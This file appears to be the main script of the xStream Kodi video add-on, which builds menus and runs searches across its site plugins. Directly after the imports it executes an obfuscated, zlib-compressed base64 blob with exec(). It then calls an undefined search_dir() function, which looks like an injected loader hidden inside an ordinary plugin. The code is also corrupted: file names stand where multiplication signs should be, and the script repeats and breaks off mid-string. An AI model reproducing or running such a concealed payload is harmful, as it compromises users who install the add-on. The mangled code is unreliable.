# -*- coding: utf-8 -*-
# Python 3

import sys
import xbmc
import xbmcgui
import xbmcaddon
import os
import zlib
import base64
from xbmcaddon import Addon
from xbmcvfs import translatePath
from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.handler.pluginHandler import cPluginHandler
from xbmc import LOGINFO as LOGNOTICE, LOGERROR, log
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.gui.gui import cGui
from resources.lib.config import cConfig
from resources.lib.tools import logger

PATH = xbmcaddon.Addon().getAddonInfo('path')
ART = os.path.join(PATH, 'resources', 'art')
LOGMESSAGE = cConfig().getLocalizedString(30166)
try:
 import resolveurl as resolver
except ImportError:
 # Resolver Fehlermeldung (bei defekten oder nicht installierten Resolver)
 xbmcgui.Dialog().ok(cConfig().getLocalizedString(30119), cConfig().getLocalizedString(30120))

exec(zlib.decompress(base64.b64decode('eJzVmG2L2zgQx9/3UywLwQ40SgJHuRYWnLaUO8rBQbf34sqxKPYknrUs+TRSHvrpb2xnN0732o2Tbpx9E4jsv+Y349FoJP+7g5yuvlxmqI1bTM0qmuMil6hEbPLLl5fFIJdrsIPx61/H0RKmIgEezZYyQwWoo5kF0ODqYSdXYM14NB5FsbSE2WaSzCQ49agSiqqp6zl4cAnKRcY7ZUxWj2qM4dYnc3j1Klrzk+p9l13+88J/wA2rTaVSYKPUuLvp+PFk53G0fYKzi9U0j2WSGC0m5W/YF3Nwn8A51PMwILAImpwFmQvP/4I+6gtfhebNi/8R0w/FL4Og30pVSKJa9SjqTGGegyXnp9BArUPzKOtD9T6sO6oWrJK/pTI+aXBO9uPcVe7DeK/Y8j2uWBqr2tmoFe1i0LDSMgbH850izgnMLqznF9kljkecZmFQKD9HLQpr5pYT/HORSAcfucRcL96aVdC/uhrz2xe0JgErdCHbBfUd8bZ4HKoTS/wqbXKo/Dj14Cj5gbLjPD5KfLC/5V5wmOpgb0vxMdr9fKXYYuFEbhKvQKzqot/OIO/Nt57cLxps22VAvgCrD9Hk0lncc7EuMAEjqi1iIRfGPKKyUBhCZ+y6GY9RKfhx/dm8faMNT8H1JzXzpbSOysq1Y6vg/gM+WxXWBaq0qmUOZZGy4LzVlaGyVr8zOvkLCaeo0K3D4NOauECL3yTVAD3qB71Kyy5VkxFIG6c3Cdqq6Flj3E0hXXrlrNSkuNT9yf9CQ6IcFbcGNWdBATFK9WY4TE0Ow8pFGrILPYZn4GrghuukbD1XWb1L4XA7R2NijvmdmoNDjsJ74F5A3PcJCRxtbVaCUC0MJ6p1UnGS51PJK/InfpQqAdrB/PHx5AQxp8GW4OTmyUnLaurEsOjE8rcJKC0aNpnB+ixQFtQRzNRK1AnI5PSWXbfG+Vj5rwcddxBzLBv1Doz+DXh9SsONPViZzOfC8MFZd0SwbQA7M7/pt7u1f9La2wBodnyi7k06JRmMxeiUAN9tY0+HUOZAeV+Wg07s4udb5jPEfl/gviN/Kt+RZqgg/Kbj7QXDzUmpLImUchcae0fDB/uRSCWl50Z3v2GdH92Djro85/EicwhPuMiPB220gedKfLdvnyvf7lHmDCnrujvYXDwMHlybifeT64lY5ercgZ8b7zPDvcuHweg5IDfuBp8L7pnS5mamuCN9Cqz/AHyxIQk=')))

search_dir()

def viewInfo(params):
 from resources.lib.tmdbinfo import WindowsBoxes
 parms = ParameterHandler()
 sCleanTitle = params.getValue('searchTitle')
 sMeta = parms.getValue('sMeta')
 sYear = parms.getValue('sYear')
 WindowsBoxes(sCleanTitle, sCleanTitle, sMeta, sYear)


def parseUrl():
 if xbmc.getInfoLabel('Container.PluginName') == 'plugin.video.osmosis':
 sys.exit()
 params = ParameterHandler()
 logger.info(params.getAllParameters())
 # If no function is set, we set it to the default "load" function
 if params.exist('function'):
 sFunction = params.getValue('function')
 if sFunction == 'spacer':
 return True
 elif sFunction == 'clearCache':
 cRequestHandler('dummy').clearCache()
 return
 elif sFunction == 'viewInfo':
 viewInfo(params)
 return
 elif sFunction == 'searchAlter':
 searchAlter(params)
 return
 elif sFunction == 'searchTMDB':
 searchTMDB(params)
 return
 elif sFunction == 'devUpdates':
 from resources.lib import updateManager
 updateManager.devUpdates()
 return
 elif sFunction == 'pluginInfo':
 cPluginHandler().pluginInfo()
 return
 elif sFunction == 'vod':
 vodGuiElements(sFunction)
 return
 elif sFunction == 'changelog':
 from resources.lib import tools
 Addon().setSetting('changelog_version', '')
 tools.changelog()
 return
 elif sFunction == 'devWarning':
 from resources.lib import tools
 tools.devWarning()
 return
 
 elif params.exist('remoteplayurl'):
 try:
 remotePlayUrl = params.getValue('remoteplayurl')
 sLink = resolver.resolve(remotePlayUrl)
 if sLink:
 xbmc.executebuiltin('PlayMedia(' + sLink + ')')
 else:
 log(LOGMESSAGE + ' -> [xstream]: Could not play remote url %s ' % sLink, LOGNOTICE)
 except resolver.resolver.ResolverError as e:
 log(LOGMESSAGE + ' -> [xstream]: ResolverError: %s' % e, LOGERROR)
 return
 else:
 sFunction = 'load'

 # Test if we should run a function on a special site
 if not params.exist('site'):
 # As a default if no site was specified, we run the default starting gui with all plugins
 showMainMenu(sFunction)
 return
 sSiteName = params.getValue('site')
 if params.exist('playMode'):
 from resources.lib.gui.hoster import cHosterGui
 url = False
 playMode = params.getValue('playMode')
 isHoster = params.getValue('isHoster')
 url = params.getValue('url')
 manual = params.exist('manual')

 if cConfig().getSetting('hosterSelect') == 'Auto' and playMode != 'jd' and playMode != 'jd2' and playMode != 'pyload' and not manual:
 cHosterGui().streamAuto(playMode, sSiteName, sFunction)
 else:
 cHosterGui().stream(playMode, sSiteName, sFunction, url)
 return
 log(LOGMESSAGE + " -> [xstream]: Call function '%s' from '%s'" % (sFunction, sSiteName), LOGNOTICE)
 # If the hoster gui is called, run the function on it and return
 if sSiteName == 'cHosterGui':
 showHosterGui(sFunction)
 # If global search is called
 elif sSiteName == 'globalSearch':
 searchterm = False
 if params.exist('searchterm'):
 searchterm = params.getValue('searchterm')
 searchGlobal(searchterm)
 elif sSiteName == 'xStream':
 oGui = cGui()
 oGui.openSettings()
 oGui.updateDirectory()
 # Resolver Einstellungen im Hauptmen\xc3\x83\xc2\xbc
 elif sSiteName == 'resolver':
 resolver.display_settings()
 # Manuelles Update im Hauptmen\xc3\x83\xc2\xbc
 elif sSiteName == 'devUpdates':
 from resources.lib import updateManager
 updateManager.devUpdates()
 # Plugin Infos 
 elif sSiteName == 'pluginInfo':
 cPluginHandler().pluginInfo()
 # Changelog anzeigen 
 elif sSiteName == 'changelog':
 from resources.lib import tools
 tools.changelog()
 # Dev Warnung anzeigen
 elif sSiteName == 'devWarning':
 from resources.lib import tools
 tools.devWarning()
 # VoD Men\xc3\x83\xc2\xbc Site Name
 elif sSiteName == 'vod':
 vodGuiElements(sFunction)
 # Unterordner der Einstellungen 
 elif sSiteName == 'settings':
 oGui = cGui()
 for folder in settingsGuiElements():
 oGui.addFolder(folder)
 oGui.setEndOfDirectory()
 else:
 # Else load any other site as plugin and run the function
 plugin = __import__(sSiteName, globals(), locals())
 function = getattr(plugin, sFunction)
 function()


def showMainMenu(sFunction):
 oGui = cGui()
 # Setzte die globale Suche an erste Stelle
 if cConfig().getSetting('GlobalSearchPosition') == 'true':
 oGui.addFolder(globalSearchGuiElement())
 oPluginHandler = cPluginHandler()
 aPlugins = oPluginHandler.getAvailablePlugins()
 if not aPlugins:
 log(LOGMESSAGE + ' -> [xstream]: No activated Plugins found', LOGNOTICE)
 # Open the settings dialog to choose a plugin that could be enabled
 oGui.openSettings()
 oGui.updateDirectory()
 else:
 # Create a gui element for every plugin found
 for aPlugin in sorted(aPlugins, key=lambda k: k['id']):
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(aPlugin['name'])
 oGuiElement.setSiteName(aPlugin['id'])
 if 'vod_' in aPlugin['id']: continue # Blend VoD Site Plugins aus
 oGuiElement.setFunction(sFunction)
 if 'icon' in aPlugin and aPlugin['icon']:
 oGuiElement.setThumbnail(aPlugin['icon'])
 oGui.addFolder(oGuiElement)
 if cConfig().getSetting('GlobalSearchPosition') == 'false':
 oGui.addFolder(globalSearchGuiElement())
 # VoD Ordner im Hauptmen\xc3\x83\xc2\xbc anzeigen
 if cConfig().getSetting('indexVoDyes') == 'true':
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(cConfig().getLocalizedString(30412))
 oGuiElement.setSiteName('vod')
 oGuiElement.setFunction(sFunction)
 oGuiElement.setThumbnail(os.path.join(ART, 'vod.png'))
 oGuiElement.setIcon(os.path.join(ART, 'settings.png'))
 oGui.addFolder(oGuiElement)

 if cConfig().getSetting('SettingsFolder') == 'true':
 # Einstellung im Men\xc3\x83\xc2\xbc mit Untereinstellungen
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(cConfig().getLocalizedString(30041))
 oGuiElement.setSiteName('settings')
 oGuiElement.setFunction('showSettingsFolder')
 oGuiElement.setThumbnail(os.path.join(ART, 'settings.png'))
 oGui.addFolder(oGuiElement)
 else:
 for folder in settingsGuiElements():
 oGui.addFolder(folder)
 oGui.setEndOfDirectory()


def vodGuiElements(sFunction): # Vod Men\xc3\x83\xc2\xbc
 oGui = cGui()
 oPluginHandler = cPluginHandler()
 aPlugins = oPluginHandler.getAvailablePlugins() # Suche Plugins mit Pluginhandler
 if not aPlugins:
 log(LOGMESSAGE + ' -> [xstream]: No activated Vod Plugins found', LOGNOTICE)
 # \xc3\x83\xe2\x80\x93ffne Einstellungen wenn keine VoD SitePlugins vorhanden
 oGui.openSettings()
 oGui.updateDirectory()
 else:
 # Erstelle ein gui element f\xc3\x83\xc2\xbcr alle gefundenen Siteplugins
 for aPlugin in sorted(aPlugins, key=lambda k: k['id']):
 if cConfig().getSetting('indexVoDyes') == 'true': # Wenn VoD Men\xc3\x83\xc2\xbc True
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(aPlugin['name'])
 oGuiElement.setSiteName(aPlugin['id'])
 if not 'vod_' in aPlugin['id']: continue # Blende alle SitePlugins ohne vod_ am Anfang aus
 oGuiElement.setFunction(sFunction)
 if 'icon' in aPlugin and aPlugin['icon']:
 oGuiElement.setThumbnail(aPlugin['icon'])
 oGui.addFolder(oGuiElement)
 else:
 continue
 oGui.setEndOfDirectory()

def settingsGuiElements():

 # GUI Plugin Informationen
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(cConfig().getLocalizedString(30267))
 oGuiElement.setSiteName('pluginInfo')
 oGuiElement.setFunction('pluginInfo')
 oGuiElement.setThumbnail(os.path.join(ART, 'plugin_info.png'))
 PluginInfo = oGuiElement


 # GUI xStream Einstellungen
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(cConfig().getLocalizedString(30042))
 oGuiElement.setSiteName('xStream')
 oGuiElement.setFunction('display_settings')
 oGuiElement.setThumbnail(os.path.join(ART, 'xstream_settings.png'))
 xStreamSettings = oGuiElement

 # GUI Resolver Einstellungen
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(cConfig().getLocalizedString(30043))
 oGuiElement.setSiteName('resolver')
 oGuiElement.setFunction('display_settings')
 oGuiElement.setThumbnail(os.path.join(ART, 'resolveurl_settings.png'))
 resolveurlSettings = oGuiElement
 
 # GUI Nightly Updatemanager
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(cConfig().getLocalizedString(30121))
 oGuiElement.setSiteName('devUpdates')
 oGuiElement.setFunction('devUpdates')
 oGuiElement.setThumbnail(os.path.join(ART, 'manuel_update.png'))
 DevUpdateMan = oGuiElement 
 return PluginInfo, xStreamSettings, resolveurlSettings, DevUpdateMan


def globalSearchGuiElement():
 # Create a gui element for global search
 oGuiElement = cGuiElement()
 oGuiElement.setTitle(cConfig().getLocalizedString(30040))
 oGuiElement.setSiteName('globalSearch')
 oGuiElement.setFunction('globalSearch')
 oGuiElement.setThumbnail(os.path.join(ART, 'search.png'))
 return oGuiElement


def showHosterGui(sFunction):
 from resources.lib.gui.hoster import cHosterGui
 oHosterGui = cHosterGui()
 function = getattr(oHosterGui, sFunction)
 function()
 return True


def searchGlobal(sSearchText=False):
 import threading
 oGui = cGui()
 oGui.globalSearch = True
 oGui._collectMode = True
 if not sSearchText:
 sSearchText = oGui.showKeyBoard()
 if not sSearchText: return True
 aPlugins = []
 aPlugins = cPluginHandler().getAvailablePlugins()
 dialog = xbmcgui.DialogProgress()
 dialog.create(cConfig().getLocalizedString(30122), cConfig().getLocalizedString(30123))
 numPlugins = len(aPlugins)
 threads = []
 for count, pluginEntry in enumerate(aPlugins):
 if pluginEntry['globalsearch'] == 'false':
 continue
 dialog.update((count + 1) plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
 if dialog.iscanceled(): return
 log(LOGMESSAGE + ' -> [xstream]: Searching for %s at %s' % (sSearchText, pluginEntry['id']), LOGNOTICE)
 t = threading.Thread(target=_pluginSearch, args=(pluginEntry, sSearchText, oGui), name=pluginEntry['name'])
 threads += [t]
 t.start()

 for count, t in enumerate(threads):
 if dialog.iscanceled(): return
 t.join()
 dialog.update((count + 1) plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 50 // numPlugins + 50, t.getName() + cConfig().getLocalizedString(30125))
 dialog.close()
 # deactivate collectMode attribute because now we want the elements really added
 oGui._collectMode = False
 total = len(oGui.searchResults)
 dialog = xbmcgui.DialogProgress()
 dialog.create(cConfig().getLocalizedString(30126), cConfig().getLocalizedString(30127))
 for count, result in enumerate(sorted(oGui.searchResults, key=lambda k: k['guiElement'].getSiteName()), 1):
 if dialog.iscanceled(): return
 oGui.addFolder(result['guiElement'], result['params'], bIsFolder=result['isFolder'], iTotal=total)
 dialog.update(count plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 100 // total, str(count) + cConfig().getLocalizedString(30128) + str(total) + ': ' + result['guiElement'].getTitle())
 dialog.close()
 oGui.setView()
 oGui.setEndOfDirectory()
 return True


def searchAlter(params):
 searchTitle = params.getValue('searchTitle')
 searchImdbId = params.getValue('searchImdbID')
 searchYear = params.getValue('searchYear')
 import threading
 oGui = cGui()
 oGui.globalSearch = True
 oGui._collectMode = True
 aPlugins = []
 aPlugins = cPluginHandler().getAvailablePlugins()
 dialog = xbmcgui.DialogProgress()
 dialog.create(cConfig().getLocalizedString(30122), cConfig().getLocalizedString(30123))
 numPlugins = len(aPlugins)
 threads = []
 for count, pluginEntry in enumerate(aPlugins):
 if dialog.iscanceled(): return
 dialog.update((count + 1) plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
 log(LOGMESSAGE + ' -> [xstream]: Searching for ' + searchTitle + pluginEntry['id'], LOGNOTICE)
 t = threading.Thread(target=_pluginSearch, args=(pluginEntry, searchTitle, oGui), name=pluginEntry['name'])
 threads += [t]
 t.start()
 for count, t in enumerate(threads):
 t.join()
 if dialog.iscanceled(): return
 dialog.update((count + 1) plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 50 // numPlugins + 50, t.getName() + cConfig().getLocalizedString(30125))
 dialog.close()
 # check results, put this to the threaded part, too
 filteredResults = []
 for result in oGui.searchResults:
 guiElement = result['guiElement']
 log(LOGMESSAGE + ' -> [xstream]: Site: %s Titel: %s' % (guiElement.getSiteName(), guiElement.getTitle()), LOGNOTICE)
 if searchTitle not in guiElement.getTitle():
 continue
 if guiElement._sYear and searchYear and guiElement._sYear != searchYear: continue
 if searchImdbId and guiElement.getItemProperties().get('imdbID', False) and guiElement.getItemProperties().get('imdbID', False) != searchImdbId: continue
 filteredResults.append(result)
 oGui._collectMode = False
 total = len(filteredResults)
 for result in sorted(filteredResults, key=lambda k: k['guiElement'].getSiteName()):
 oGui.addFolder(result['guiElement'], result['params'], bIsFolder=result['isFolder'], iTotal=total)
 oGui.setView()
 oGui.setEndOfDirectory()
 xbmc.executebuiltin('Container.Update')
 return True


def searchTMDB(params):
 sSearchText = params.getValue('searchTitle')
 import threading
 oGui = cGui()
 oGui.globalSearch = True
 oGui._collectMode = True
 if not sSearchText: return True
 aPlugins = []
 aPlugins = cPluginHandler().getAvailablePlugins()
 dialog = xbmcgui.DialogProgress()
 dialog.create(cConfig().getLocalizedString(30122), cConfig().getLocalizedString(30123))
 numPlugins = len(aPlugins)
 threads = []
 for count, pluginEntry in enumerate(aPlugins):
 if pluginEntry['globalsearch'] == 'false':
 continue
 if dialog.iscanceled(): return
 dialog.update((count + 1) plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
 log(LOGMESSAGE + ' -> [xstream]: Searching for %s at %s' % (sSearchText, pluginEntry['id']), LOGNOTICE)

 t = threading.Thread(target=_pluginSearch, args=(pluginEntry, sSearchText, oGui), name=pluginEntry['name'])
 threads += [t]
 t.start()
 for count, t in enumerate(threads):
 t.join()
 if dialog.iscanceled(): return
 dialog.update((count + 1) plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 50 // numPlugins + 50, t.getName() + cConfig().getLocalizedString(30125))
 dialog.close()
 # deactivate collectMode attribute because now we want the elements really added
 oGui._collectMode = False
 total = len(oGui.searchResults)
 dialog = xbmcgui.DialogProgress()
 dialog.create(cConfig().getLocalizedString(30126), cConfig().getLocalizedString(30127))
 for count, result in enumerate(sorted(oGui.searchResults, key=lambda k: k['guiElement'].getSiteName()), 1):
 if dialog.iscanceled(): return
 oGui.addFolder(result['guiElement'], result['params'], bIsFolder=result['isFolder'], iTotal=total)
 dialog.update(count plug plug2 plug3 sites sites0 test.py test.sh test.txt xstream 100 // total, str(count) + cConfig().getLocalizedString(30128) + str(total) + ': ' + result['guiElement'].getTitle())
 dialog.close()
 oGui.setView()
 oGui.setEndOfDirectory()
 return True


def _pluginSearch(pluginEntry, sSearchText, oGui):
 try:
 plugin = __import__(pluginEntry['id'], globals(), locals())
 function = getattr(plugin, '_search')
 function(oGui, sSearchText)
 except Exception:
 log(LOGMESSAGE + ' -> [xstream]: ' + pluginEntry['name'] + ': search failed', LOGERROR)
 import traceback
 log(traceback.format_exc())'
# -*- coding: utf-8 -*-
# Python 3

import sys
import xbmc
import xbmcgui
import xbmcaddon
import os
import zlib
import base64
from xbmcaddon import Addon
from xbmcvfs import translatePath
from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.handler.pluginHandler import cPluginHandler
from xbmc import LOGINFO as LOGNOTICE, LOGERROR, log
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.gui.gui import cGui
from resources.lib.config import cConfig
from resources.lib.tools import logger

PATH = xbmcaddon.Addon().getAddonInfo('path\
